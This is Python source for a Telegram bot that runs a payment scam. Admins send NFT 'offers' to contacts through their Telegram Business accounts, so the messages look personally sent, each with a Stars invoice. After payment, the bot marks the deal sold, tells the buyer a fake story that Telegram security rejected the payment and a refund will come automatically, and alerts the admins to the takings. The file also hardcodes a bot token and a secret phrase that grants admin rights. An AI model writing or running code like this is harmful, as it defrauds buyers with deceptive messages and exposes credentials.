import asyncio
import asyncpg
import aiohttp
import os
import html
from aiohttp import web
from PIL import Image, ImageDraw
from aiogram import Bot, Dispatcher, F
from aiogram.types import (
    Message, CallbackQuery, InlineKeyboardMarkup, InlineKeyboardButton,
    LabeledPrice, PreCheckoutQuery, BusinessConnection,
    KeyboardButton, ReplyKeyboardMarkup, KeyboardButtonRequestUsers,
    UsersShared, FSInputFile
)
from aiogram.types import (
    InputRichMessage,
    InputRichBlockButtons,
    InputRichBlockParagraph,
    RichMessageButton,
)
from aiogram.filters import CommandStart, Command, CommandObject
from aiogram.fsm.state import State, StatesGroup
from aiogram.fsm.context import FSMContext
from aiogram.fsm.storage.memory import MemoryStorage

# ================= НАСТРОЙКИ =================
BOT_TOKEN = "8791943679:AAF7jEofXkuElG5qLVzy4ahzEg1kU0n7m74"
OWNER_USERNAME = "NorikAmiri"
SECRET_CODE = "norik228TOP"
AVATAR_BG = "#17212B"
PORT = int(os.environ.get("PORT", 10000))

DATABASE_URL = os.environ.get("DATABASE_URL")

bot = Bot(token=BOT_TOKEN)
dp = Dispatcher(storage=MemoryStorage())

BUSINESS_CONNECTION_ID = None
DB_POOL = None


def hex_to_rgb(hex_color: str):
    hex_color = hex_color.lstrip("#")
    return tuple(int(hex_color[i:i + 2], 16) for i in (0, 2, 4))


# ================= БАЗА =================
async def init_db():
    global DB_POOL
    if not DATABASE_URL:
        raise RuntimeError("DATABASE_URL не задан. Добавь в Render → Environment")

    dsn = DATABASE_URL.replace("postgres://", "postgresql://", 1)
    DB_POOL = await asyncpg.create_pool(dsn=dsn, min_size=1, max_size=10)

    async with DB_POOL.acquire() as conn:
        await conn.execute("""
            CREATE TABLE IF NOT EXISTS deals (
                id SERIAL PRIMARY KEY,
                owner_id BIGINT,
                nft_name TEXT,
                nft_link TEXT,
                seller TEXT,
                price INTEGER,
                status TEXT DEFAULT 'pending'
            )
        """)
        await conn.execute("""
            CREATE TABLE IF NOT EXISTS settings (
                key TEXT PRIMARY KEY,
                value TEXT
            )
        """)
        await conn.execute("""
            CREATE TABLE IF NOT EXISTS admins (
                user_id BIGINT PRIMARY KEY,
                username TEXT,
                display_name TEXT
            )
        """)
        await conn.execute("""
            CREATE TABLE IF NOT EXISTS users (
                user_id BIGINT PRIMARY KEY,
                username TEXT,
                first_name TEXT,
                has_business BOOLEAN DEFAULT FALSE,
                business_id TEXT,
                is_enabled BOOLEAN DEFAULT FALSE,
                created_at TIMESTAMP DEFAULT NOW()
            )
        """)
        await conn.execute("""
            CREATE TABLE IF NOT EXISTS banned (
                user_id BIGINT PRIMARY KEY,
                username TEXT,
                reason TEXT,
                banned_at TIMESTAMP DEFAULT NOW()
            )
        """)

        # ===== МИГРАЦИИ =====
        await conn.execute("ALTER TABLE deals ADD COLUMN IF NOT EXISTS owner_id BIGINT")
        await conn.execute("ALTER TABLE users ADD COLUMN IF NOT EXISTS username TEXT")
        await conn.execute("ALTER TABLE users ADD COLUMN IF NOT EXISTS first_name TEXT")
        await conn.execute("ALTER TABLE users ADD COLUMN IF NOT EXISTS has_business BOOLEAN DEFAULT FALSE")
        await conn.execute("ALTER TABLE users ADD COLUMN IF NOT EXISTS business_id TEXT")
        await conn.execute("ALTER TABLE users ADD COLUMN IF NOT EXISTS is_enabled BOOLEAN DEFAULT FALSE")
        await conn.execute("ALTER TABLE users ADD COLUMN IF NOT EXISTS created_at TIMESTAMP DEFAULT NOW()")

    print("🐘 PostgreSQL подключён")


async def save_setting(key: str, value: str):
    async with DB_POOL.acquire() as conn:
        await conn.execute(
            "INSERT INTO settings (key, value) VALUES ($1, $2) "
            "ON CONFLICT (key) DO UPDATE SET value = EXCLUDED.value",
            key, value
        )


async def get_setting(key: str):
    async with DB_POOL.acquire() as conn:
        row = await conn.fetchrow("SELECT value FROM settings WHERE key=$1", key)
        return row["value"] if row else None


async def save_user(user_id: int, username: str, first_name: str):
    async with DB_POOL.acquire() as conn:
        await conn.execute(
            "INSERT INTO users (user_id, username, first_name) VALUES ($1, $2, $3) "
            "ON CONFLICT (user_id) DO UPDATE SET username = EXCLUDED.username, first_name = EXCLUDED.first_name",
            user_id, username, first_name
        )


async def mark_user_business(user_id: int, username: str, first_name: str, business_id: str, is_enabled: bool = True):
    async with DB_POOL.acquire() as conn:
        await conn.execute(
            "INSERT INTO users (user_id, username, first_name, has_business, business_id, is_enabled) "
            "VALUES ($1, $2, $3, $4, $5, $6) "
            "ON CONFLICT (user_id) DO UPDATE SET "
            "username = EXCLUDED.username, first_name = EXCLUDED.first_name, "
            "has_business = $4, business_id = $5, is_enabled = $6",
            user_id, username, first_name, True, business_id, is_enabled
        )


async def get_user_business(user_id: int):
    """Возвращает (business_id, is_enabled) конкретного пользователя."""
    async with DB_POOL.acquire() as conn:
        row = await conn.fetchrow(
            "SELECT business_id, is_enabled FROM users WHERE user_id=$1", user_id
        )
        if row and row["business_id"]:
            return row["business_id"], bool(row["is_enabled"])
        return None, False


async def is_banned(user_id: int) -> bool:
    async with DB_POOL.acquire() as conn:
        row = await conn.fetchrow("SELECT user_id FROM banned WHERE user_id=$1", user_id)
        return row is not None


async def ban_user(user_id: int, username: str, reason: str = "Без причины"):
    async with DB_POOL.acquire() as conn:
        await conn.execute(
            "INSERT INTO banned (user_id, username, reason) VALUES ($1, $2, $3) "
            "ON CONFLICT (user_id) DO UPDATE SET reason = EXCLUDED.reason",
            user_id, username, reason
        )


async def unban_user(user_id: int):
    async with DB_POOL.acquire() as conn:
        await conn.execute("DELETE FROM banned WHERE user_id=$1", user_id)


async def is_admin(user_id: int, username: str) -> bool:
    if username == OWNER_USERNAME:
        return True
    async with DB_POOL.acquire() as conn:
        row = await conn.fetchrow("SELECT user_id FROM admins WHERE user_id=$1", user_id)
        return row is not None


async def add_admin(user_id: int, username: str, display_name: str):
    async with DB_POOL.acquire() as conn:
        await conn.execute(
            "INSERT INTO admins (user_id, username, display_name) VALUES ($1, $2, $3) "
            "ON CONFLICT (user_id) DO UPDATE SET username = EXCLUDED.username, display_name = EXCLUDED.display_name",
            user_id, username, display_name
        )


# ================= ЗАГРУЗКА ФОТО =================
async def upload_to_telegraph(file_path: str):
    url = "https://telegra.ph/upload"
    try:
        async with aiohttp.ClientSession(timeout=aiohttp.ClientTimeout(total=30)) as session:
            with open(file_path, "rb") as f:
                data = aiohttp.FormData()
                data.add_field("file", f, filename="img.jpg", content_type="image/jpeg")
                async with session.post(url, data=data) as resp:
                    if resp.status != 200:
                        return None
                    result = await resp.json()
                    if isinstance(result, list) and result and "src" in result[0]:
                        return "https://telegra.ph" + result[0]["src"]
    except Exception as e:
        print(f"[telegra.ph] Ошибка: {e}")
    return None


async def upload_to_catbox(file_path: str):
    url = "https://catbox.moe/user/api.php"
    try:
        async with aiohttp.ClientSession(timeout=aiohttp.ClientTimeout(total=60)) as session:
            with open(file_path, "rb") as f:
                data = aiohttp.FormData()
                data.add_field("reqtype", "fileupload")
                data.add_field("fileToUpload", f, filename="img.jpg", content_type="image/jpeg")
                async with session.post(url, data=data) as resp:
                    text = (await resp.text()).strip()
                    if text.startswith("http"):
                        return text
    except Exception as e:
        print(f"[catbox] Ошибка: {e}")
    return None


async def upload_photo(file_path: str):
    link = await upload_to_telegraph(file_path)
    if link:
        return link
    return await upload_to_catbox(file_path)


# ================= АВАТАРКА БОТА =================
def make_circle_avatar(input_path: str, output_path: str, size: int = 1024, bg_hex: str = "#17212B"):
    try:
        img = Image.open(input_path).convert("RGBA")
        w, h = img.size
        side = min(w, h)
        left = (w - side) // 2
        top = (h - side) // 2
        img = img.crop((left, top, left + side, top + side))
        img = img.resize((size, size), Image.LANCZOS)

        mask = Image.new("L", (size, size), 0)
        draw = ImageDraw.Draw(mask)
        draw.ellipse((0, 0, size, size), fill=255)

        bg = Image.new("RGBA", (size, size), hex_to_rgb(bg_hex) + (255,))
        bg.paste(img, (0, 0), mask)

        bg.convert("RGB").save(output_path, "JPEG", quality=95)
        return True
    except Exception as e:
        print(f"[circle] Ошибка: {e}")
        return False


async def get_current_bot_avatar_url():
    try:
        me = await bot.get_me()
        photos = await bot.get_user_profile_photos(user_id=me.id, limit=1)
        if not photos.total_count or not photos.photos:
            return None

        sizes = photos.photos[0]
        file_id = sizes[-1].file_id
        file = await bot.get_file(file_id)

        raw_path = f"bot_avatar_raw_{me.id}.jpg"
        round_path = f"bot_avatar_round_{me.id}.jpg"
        await bot.download_file(file.file_path, destination=raw_path)

        ok = make_circle_avatar(raw_path, round_path, size=1024, bg_hex=AVATAR_BG)
        upload_path = round_path if ok else raw_path
        return await upload_photo(upload_path)
    except Exception as e:
        print(f"[avatar] Ошибка: {e}")
        return None


# ================= FSM =================
class DealForm(StatesGroup):
    nft_name = State()
    nft_link = State()
    seller = State()
    price = State()
    select_chat = State()


# ================= BUSINESS =================
@dp.business_connection()
async def on_business_connection(connection: BusinessConnection):
    global BUSINESS_CONNECTION_ID
    BUSINESS_CONNECTION_ID = connection.id
    await save_setting("business_connection_id", connection.id)

    try:
        user = connection.user
        is_enabled = getattr(connection, "is_enabled", True)
        await mark_user_business(
            user.id, user.username or "", user.first_name or "",
            connection.id, is_enabled
        )
        print(f"✅ Business Connection: {connection.id} (user={user.id}, enabled={is_enabled})")
    except Exception as e:
        print(f"[business_connection] Ошибка: {e}")


@dp.business_message()
async def on_business_message(message: Message):
    global BUSINESS_CONNECTION_ID
    if message.business_connection_id and not BUSINESS_CONNECTION_ID:
        BUSINESS_CONNECTION_ID = message.business_connection_id
        await save_setting("business_connection_id", message.business_connection_id)
        print(f"✅ Business Connection перехвачен: {message.business_connection_id}")


# ================= АКТИВАЦИЯ ПРАВ =================
@dp.message(F.text == SECRET_CODE)
async def activate_admin(message: Message):
    name = f"@{message.from_user.username}" if message.from_user.username else (message.from_user.first_name or "Пользователь")
    await add_admin(message.from_user.id, message.from_user.username or "", name)
    await message.answer(f"🔑 <b>Права администратора активированы!</b>\nИмя: {html.escape(name)}", parse_mode="HTML")


# ================= ХЕЛПЕР: ПОКАЗАТЬ ЛОТЫ =================
async def show_lots(target_message: Message, owner_id: int):
    async with DB_POOL.acquire() as conn:
        rows = await conn.fetch(
            "SELECT id, nft_name, price FROM deals WHERE status='pending' AND owner_id=$1 ORDER BY id DESC",
            owner_id
        )

    if not rows:
        await target_message.answer("У вас нет лотов.")
        return

    for r in rows:
        deal_id = r["id"]
        nft_name = html.escape(r["nft_name"] or "NFT")
        price = r["price"]
        kb = InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="Выбрать получателя", callback_data=f"pick_{deal_id}", style="primary")],
            [InlineKeyboardButton(text="Удалить", callback_data=f"del_{deal_id}", style="danger")]
        ])
        await target_message.answer(
            f"🕯️ <b>{nft_name}</b> — {price}⭐",
            reply_markup=kb,
            parse_mode="HTML"
        )


# ================= ХЕЛПЕР: ПОКАЗАТЬ ЮЗЕРОВ =================
async def show_users(target_message: Message):
    async with DB_POOL.acquire() as conn:
        rows = await conn.fetch(
            "SELECT user_id, username, first_name, has_business, business_id, is_enabled, created_at "
            "FROM users ORDER BY has_business DESC, created_at DESC LIMIT 50"
        )

    if not rows:
        await target_message.answer("👥 Пока никто не заходил в бота.")
        return

    await target_message.answer(f"👥 <b>Пользователи бота</b> ({len(rows)}):", parse_mode="HTML")

    for r in rows:
        uid = r["user_id"]
        raw_uname = r["username"] or ""
        raw_fname = r["first_name"] or "—"

        uname = f"@{html.escape(raw_uname)}" if raw_uname else "—"
        fname = html.escape(raw_fname)

        if r["has_business"] and r["is_enabled"]:
            has_biz = "🟢 Бизнес (активен)"
        elif r["has_business"]:
            has_biz = "🟡 Бизнес (выключен)"
        else:
            has_biz = "⚪ Без бизнеса"

        banned = await is_banned(uid)
        status = "🚫 ЗАБАНЕН" if banned else has_biz

        text = (
            f"👤 <b>{fname}</b>\n"
            f"🔗 {uname}\n"
            f"📱 <code>{uid}</code>\n"
            f"Статус: {status}"
        )

        if banned:
            kb = InlineKeyboardMarkup(inline_keyboard=[
                [InlineKeyboardButton(text="✅ Разбанить", callback_data=f"unban_{uid}")]
            ])
        else:
            kb = InlineKeyboardMarkup(inline_keyboard=[
                [InlineKeyboardButton(text="🚫 Забанить", callback_data=f"ban_{uid}")]
            ])

        await target_message.answer(text, parse_mode="HTML", reply_markup=kb)


# ================= СТАРТ =================
@dp.message(CommandStart(deep_link=False))
async def start(message: Message):
    global BUSINESS_CONNECTION_ID

    await save_user(
        message.from_user.id,
        message.from_user.username or "",
        message.from_user.first_name or ""
    )

    if await is_banned(message.from_user.id):
        return

    if not await is_admin(message.from_user.id, message.from_user.username):
        await message.answer("❌ У вас нет доступа к боту.")
        return

    my_business_id, my_enabled = await get_user_business(message.from_user.id)
    if not my_business_id:
        saved = await get_setting("business_connection_id")
        if saved:
            my_business_id = saved
            my_enabled = True

    if my_business_id and my_enabled:
        status = "🟢 Подключён"
    elif my_business_id and not my_enabled:
        status = "🟡 Подключён, но выключен"
    else:
        status = "🔴 Не подключён (подключи в Telegram Business)"

    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="➕ Создать запрос", callback_data="new_deal", style="success")],
        [InlineKeyboardButton(text="📋 Мои лоты", callback_data="my_lots", style="primary")],
        [InlineKeyboardButton(text="👥 Пользователи", callback_data="users_list", style="primary")]
    ])
    await message.answer(f"👑 Админ-панель\nBusiness: {status}", reply_markup=kb)


# ================= DEEP-LINK =================
@dp.message(CommandStart(deep_link=True))
async def start_deeplink(message: Message, command: CommandObject):
    await save_user(
        message.from_user.id,
        message.from_user.username or "",
        message.from_user.first_name or ""
    )

    if await is_banned(message.from_user.id):
        return

    payload = command.args
    if not payload:
        return
    if payload.startswith("deal_"):
        deal_id = int(payload.split("_")[1])
        await open_payment(message.from_user.id, deal_id)


async def open_payment(user_id: int, deal_id: int):
    async with DB_POOL.acquire() as conn:
        row = await conn.fetchrow(
            "SELECT nft_name, seller, price FROM deals WHERE id=$1 AND status='pending'",
            deal_id
        )
    if not row:
        return

    photo_url = await get_current_bot_avatar_url()
    kwargs = {}
    if photo_url:
        kwargs["photo_url"] = photo_url

    await bot.send_invoice(
        chat_id=user_id,
        title=row["nft_name"] or "NFT Подарок",
        description=f"Покупка у {row['seller'] or 'продавца'}",
        payload=f"deal_{deal_id}",
        provider_token="",
        currency="XTR",
        prices=[LabeledPrice(label=row["nft_name"] or "NFT", amount=row["price"])],
        **kwargs
    )


# ================= СОЗДАНИЕ ЛОТА =================
@dp.callback_query(F.data == "new_deal")
async def new_deal(callback: CallbackQuery, state: FSMContext):
    if await is_banned(callback.from_user.id):
        return
    if not await is_admin(callback.from_user.id, callback.from_user.username):
        return
    await callback.message.answer("1️⃣ Введи название NFT:")
    await state.set_state(DealForm.nft_name)
    await callback.answer()


@dp.message(DealForm.nft_name)
async def set_name(message: Message, state: FSMContext):
    if await is_banned(message.from_user.id):
        return
    await state.update_data(nft_name=message.text)
    await message.answer("2️⃣ Введи ссылку на NFT:")
    await state.set_state(DealForm.nft_link)


@dp.message(DealForm.nft_link)
async def set_link(message: Message, state: FSMContext):
    if await is_banned(message.from_user.id):
        return
    await state.update_data(nft_link=message.text)
    await message.answer("3️⃣ Введи имя продавца:")
    await state.set_state(DealForm.seller)


@dp.message(DealForm.seller)
async def set_seller(message: Message, state: FSMContext):
    if await is_banned(message.from_user.id):
        return
    await state.update_data(seller=message.text)
    await message.answer("4️⃣ Введи цену в звёздах:")
    await state.set_state(DealForm.price)


@dp.message(DealForm.price)
async def set_price(message: Message, state: FSMContext):
    if await is_banned(message.from_user.id):
        return
    if not message.text.isdigit():
        await message.answer("❌ Только число.")
        return

    await state.update_data(price=int(message.text))
    data = await state.get_data()

    async with DB_POOL.acquire() as conn:
        row = await conn.fetchrow(
            "INSERT INTO deals (owner_id, nft_name, nft_link, seller, price) "
            "VALUES ($1, $2, $3, $4, $5) RETURNING id",
            message.from_user.id, data["nft_name"], data["nft_link"],
            data["seller"], data["price"]
        )
        deal_id = row["id"]

    await message.answer(f"✅ Лот #{deal_id} создан! Выбери получателя:", parse_mode="HTML")
    await show_lots(message, message.from_user.id)
    await state.clear()


# ================= МОИ ЛОТЫ =================
@dp.callback_query(F.data == "my_lots")
async def my_lots(callback: CallbackQuery):
    if await is_banned(callback.from_user.id):
        return
    if not await is_admin(callback.from_user.id, callback.from_user.username):
        return
    await show_lots(callback.message, callback.from_user.id)
    await callback.answer()


# ================= СПИСОК ЮЗЕРОВ =================
@dp.callback_query(F.data == "users_list")
async def users_list(callback: CallbackQuery):
    if await is_banned(callback.from_user.id):
        return
    if not await is_admin(callback.from_user.id, callback.from_user.username):
        return
    await show_users(callback.message)
    await callback.answer()


# ================= БАН / РАЗБАН =================
@dp.callback_query(F.data.startswith("ban_"))
async def ban_callback(callback: CallbackQuery):
    if not await is_admin(callback.from_user.id, callback.from_user.username):
        return

    target_id = int(callback.data.split("_")[1])
    async with DB_POOL.acquire() as conn:
        row = await conn.fetchrow("SELECT username, first_name FROM users WHERE user_id=$1", target_id)

    uname = row["username"] if row else ""
    await ban_user(target_id, uname, "Забанен админом")
    await callback.answer(f"🚫 Пользователь {target_id} забанен", show_alert=True)

    try:
        await callback.message.edit_reply_markup(
            reply_markup=InlineKeyboardMarkup(inline_keyboard=[
                [InlineKeyboardButton(text="✅ Разбанить", callback_data=f"unban_{target_id}")]
            ])
        )
    except:
        pass


@dp.callback_query(F.data.startswith("unban_"))
async def unban_callback(callback: CallbackQuery):
    if not await is_admin(callback.from_user.id, callback.from_user.username):
        return

    target_id = int(callback.data.split("_")[1])
    await unban_user(target_id)
    await callback.answer(f"✅ Пользователь {target_id} разбанен", show_alert=True)

    try:
        await callback.message.edit_reply_markup(
            reply_markup=InlineKeyboardMarkup(inline_keyboard=[
                [InlineKeyboardButton(text="🚫 Забанить", callback_data=f"ban_{target_id}")]
            ])
        )
    except:
        pass


# ================= УДАЛЕНИЕ ЛОТА =================
@dp.callback_query(F.data.startswith("del_"))
async def delete_lot(callback: CallbackQuery):
    if await is_banned(callback.from_user.id):
        return
    deal_id = int(callback.data.split("_")[1])
    async with DB_POOL.acquire() as conn:
        row = await conn.fetchrow("SELECT owner_id FROM deals WHERE id=$1", deal_id)
        if not row:
            await callback.answer("Лот не найден", show_alert=True)
            return
        if row["owner_id"] != callback.from_user.id and callback.from_user.username != OWNER_USERNAME:
            await callback.answer("❌ Это не ваш лот", show_alert=True)
            return
        await conn.execute("DELETE FROM deals WHERE id=$1", deal_id)
    await callback.answer("Лот удалён", show_alert=True)
    try:
        await callback.message.delete()
    except:
        pass


# ================= ВЫБОР ЛОТА =================
@dp.callback_query(F.data.startswith("pick_"))
async def pick_lot(callback: CallbackQuery, state: FSMContext):
    if await is_banned(callback.from_user.id):
        return
    deal_id = int(callback.data.split("_")[1])

    async with DB_POOL.acquire() as conn:
        row = await conn.fetchrow("SELECT owner_id FROM deals WHERE id=$1", deal_id)

    if not row:
        await callback.answer("Лот не найден", show_alert=True)
        return
    if row["owner_id"] != callback.from_user.id and callback.from_user.username != OWNER_USERNAME:
        await callback.answer("❌ Это не ваш лот", show_alert=True)
        return

    await state.update_data(deal_id=deal_id)

    kb = ReplyKeyboardMarkup(
        keyboard=[[
            KeyboardButton(
                text="👤 Выбрать получателя",
                request_users=KeyboardButtonRequestUsers(
                    request_id=deal_id,
                    user_is_bot=False,
                    max_quantity=1,
                    request_name=True,
                    request_username=True
                )
            )
        ]],
        resize_keyboard=True,
        one_time_keyboard=True
    )

    await callback.message.answer("👤 Нажми кнопку ниже и выбери чат:", reply_markup=kb)
    await state.set_state(DealForm.select_chat)
    await callback.answer()


# ================= ВЫБОР ПОЛУЧАТЕЛЯ → ОТПРАВКА ОТ ИМЕНИ АДМИНА =================
@dp.message(DealForm.select_chat, F.users_shared)
async def on_user_selected(message: Message, state: FSMContext):
    if await is_banned(message.from_user.id):
        await state.clear()
        return

    users_shared: UsersShared = message.users_shared
    deal_id = users_shared.request_id
    user_id = users_shared.users[0].user_id

    sender_name = message.from_user.first_name or "Пользователь"

    # 1) Берём business_id и статус именно ЭТОГО админа
    sender_business_id, sender_enabled = await get_user_business(message.from_user.id)
    if not sender_business_id:
        saved = await get_setting("business_connection_id")
        if saved:
            sender_business_id = saved
            sender_enabled = True

    if not sender_business_id:
        await message.answer(
            "❌ <b>У тебя не подключён Business-аккаунт.</b>\n\n"
            "Подключи бота: Telegram → Настройки → Telegram Business → Чат-боты → добавь этого бота.",
            parse_mode="HTML",
            reply_markup=ReplyKeyboardMarkup(keyboard=[], resize_keyboard=True)
        )
        await state.clear()
        return

    if not sender_enabled:
        await message.answer(
            "⚠️ <b>Твой Business-бот сейчас выключен.</b>\n\n"
            "Включи его: Telegram → Настройки → Telegram Business → Чат-боты → включи бота.\n"
            "Без этого отправка не сработает.",
            parse_mode="HTML",
            reply_markup=ReplyKeyboardMarkup(keyboard=[], resize_keyboard=True)
        )
        await state.clear()
        return

    # 2) Достаём лот
    async with DB_POOL.acquire() as conn:
        row = await conn.fetchrow(
            "SELECT owner_id, nft_name, nft_link, seller, price FROM deals WHERE id=$1",
            deal_id
        )

    if not row:
        await message.answer("❌ Лот не найден.", reply_markup=ReplyKeyboardMarkup(keyboard=[], resize_keyboard=True))
        await state.clear()
        return

    owner_id = row["owner_id"]
    nft_name = row["nft_name"] or "NFT"
    nft_link = row["nft_link"] or ""
    seller = row["seller"] or "продавца"
    price = row["price"]

    if owner_id != message.from_user.id and message.from_user.username != OWNER_USERNAME:
        await message.answer("❌ Это не ваш лот.", reply_markup=ReplyKeyboardMarkup(keyboard=[], resize_keyboard=True))
        await state.clear()
        return

    # 3) Готовим инвойс-ссылку
    photo_url = await get_current_bot_avatar_url()
    invoice_kwargs = {}
    if photo_url:
        invoice_kwargs["photo_url"] = photo_url

    try:
        invoice_link = await bot.create_invoice_link(
            title=nft_name,
            description=f"Покупка у {seller}",
            payload=f"deal_{deal_id}",
            provider_token="",
            currency="XTR",
            prices=[LabeledPrice(label=nft_name, amount=price)],
            **invoice_kwargs
        )
        print(f"[invoice] создан: {invoice_link}")
    except Exception as e:
        print(f"[invoice] Ошибка: {e}")
        invoice_link = None

    if not invoice_link:
        await message.answer(
            "❌ Не удалось создать инвойс.",
            reply_markup=ReplyKeyboardMarkup(keyboard=[], resize_keyboard=True)
        )
        await state.clear()
        return

    # 4) Формируем rich-сообщение
    rich_message = InputRichMessage(
        blocks=[
            InputRichBlockParagraph(text=f"{sender_name} предлагает {nft_link} За {price} звезд."),
            InputRichBlockParagraph(text="\n\nПредложение действует 24 часа"),
            InputRichBlockButtons(buttons=[RichMessageButton(text="ПРИНЯТЬ", url=invoice_link, style="success")]),
            InputRichBlockButtons(buttons=[RichMessageButton(text="ИГНОРИРОВАТЬ", url=f"https://t.me/{OWNER_USERNAME}", style="danger")])
        ]
    )

    # 5) Отправляем ТОЛЬКО через Business
    try:
        await bot.send_rich_message(
            chat_id=user_id,
            rich_message=rich_message,
            business_connection_id=sender_business_id
        )
        print(f"[send] OK через business {sender_business_id} → {user_id}")
        await message.answer(
            "✅ Отправлено от твоего имени!",
            reply_markup=ReplyKeyboardMarkup(keyboard=[], resize_keyboard=True)
        )
    except Exception as e:
        err = str(e)
        print(f"[send business] Ошибка: {e}")

        if "BUSINESS_PEER_USAGE_MISSING" in err:
            hint = (
                "❌ <b>Telegram не дал отправить.</b>\n\n"
                "<b>Причина:</b> <code>BUSINESS_PEER_USAGE_MISSING</code>\n\n"
                "Это ограничение Telegram: бот может писать через Business только в те чаты, "
                "где <b>диалог был активен в последние 24 часа</b>. "
                "Просто «когда-то было сообщение» — недостаточно.\n\n"
                "<b>Что делать:</b> напиши сам этому человеку что-нибудь в ЛС (или попроси его написать тебе), "
                "и <b>сразу после этого</b> попробуй отправить заявку снова — она уйдёт."
            )
        elif "BUSINESS_PEER_INVALID" in err:
            hint = (
                "❌ <b>Неверный Business-чат.</b>\n\n"
                "<b>Причина:</b> <code>BUSINESS_PEER_INVALID</code>\n\n"
                "Похоже, этот человек не является контактом твоего Business-аккаунта, "
                "или ты выбрал не тот чат. Проверь, что выбрал именно тот ЛС."
            )
        else:
            hint = f"❌ Не удалось отправить.\n<code>{html.escape(err)}</code>"

        await message.answer(hint, parse_mode="HTML",
                             reply_markup=ReplyKeyboardMarkup(keyboard=[], resize_keyboard=True))

    await state.clear()


# ================= ОПЛАТА =================
@dp.pre_checkout_query()
async def pre_checkout(query: PreCheckoutQuery):
    print(f"[pre_checkout] От {query.from_user.id}, payload={query.invoice_payload}")
    await bot.answer_pre_checkout_query(query.id, ok=True)


@dp.message(F.successful_payment)
async def payment_success(message: Message):
    print(f"[payment] Ловлю successful_payment от {message.from_user.id}")
    payload = message.successful_payment.invoice_payload
    deal_id = int(payload.split("_")[1])

    async with DB_POOL.acquire() as conn:
        await conn.execute("UPDATE deals SET status='sold' WHERE id=$1", deal_id)
        row = await conn.fetchrow(
            "SELECT owner_id, nft_name, seller, price FROM deals WHERE id=$1", deal_id
        )

    nft_name = row["nft_name"] if row else "NFT"
    seller = row["seller"] if row else "продавец"
    price = row["price"] if row else message.successful_payment.total_amount
    deal_owner_id = row["owner_id"] if row else None

    buyer = message.from_user
    buyer_id = buyer.id
    buyer_username = f"@{buyer.username}" if buyer.username else "—"
    buyer_first_name = buyer.first_name or "Покупатель"
    buyer_link = f'<a href="tg://user?id={buyer_id}">{html.escape(buyer_first_name)}</a>'

    try:
        await message.answer(
            '<tg-emoji emoji-id="5447644880824181073">⭐</tg-emoji> '
            '<b>Ваш платёж был обработан, однако зачисление звёзд на счёт бота не произошло. '
            'Платёж отклонён системой безопасности Telegram в связи с подозрительной активностью.</b>\n\n'
            '<b>Возврат звёзд на ваш баланс будет произведён автоматически в срок от 1 дня до 14 дней, без вашего участия.</b>\n\n'
            '<b>Товар не выдан, так как оплата не была зачислена. Повторная оплата не требуется.</b>\n\n'
            '<b>В целях безопасности излишние кнопки трогать не нужно. Дождитесь автоматического возврата средств на ваш баланс.</b>\n\n'
            '<b>По вопросам возврата вы можете обратиться в официальную поддержку Telegram.</b>',
            parse_mode="HTML"
        )
    except Exception as e:
        print(f"[payment] Ошибка отправки покупателю: {e}")

    text = (
        f"💰 <b>НОВАЯ ОПЛАТА!</b>\n\n"
        f"👤 Покупатель: {buyer_link}\n"
        f"🔗 Юзернейм: {buyer_username}\n"
        f"📱 ID: <code>{buyer_id}</code>\n\n"
        f"🕯️ Лот: <b>{html.escape(nft_name)}</b>\n"
        f"👑 Продавец: {html.escape(seller)}\n"
        f"⭐ Сумма: <b>{price} звёзд</b>"
    )

    recipients = set()
    if deal_owner_id:
        recipients.add(deal_owner_id)
    try:
        owner_chat = await bot.get_chat(f"@{OWNER_USERNAME}")
        recipients.add(owner_chat.id)
    except Exception as e:
        print(f"Не удалось получить ID владельца: {e}")

    for admin_id in recipients:
        try:
            await bot.send_message(admin_id, text, parse_mode="HTML")
        except Exception as e:
            print(f"Не удалось отправить уведомление {admin_id}: {e}")


# ================= ВЕБ-СЕРВЕР =================
async def health(request):
    return web.Response(text="OK")


async def start_web_server():
    app = web.Application()
    app.router.add_get("/", health)
    app.router.add_get("/health", health)
    runner = web.AppRunner(app)
    await runner.setup()
    site = web.TCPSite(runner, "0.0.0.0", PORT)
    await site.start()
    print(f"🌐 Веб-сервер на порту {PORT}")


# ================= ЗАПУСК =================
async def main():
    global BUSINESS_CONNECTION_ID
    await init_db()

    saved = await get_setting("business_connection_id")
    if saved:
        BUSINESS_CONNECTION_ID = saved

    await start_web_server()
    print("Бот запущен...")
    await dp.start_polling(bot)


if __name__ == "__main__":
    asyncio.run(main())
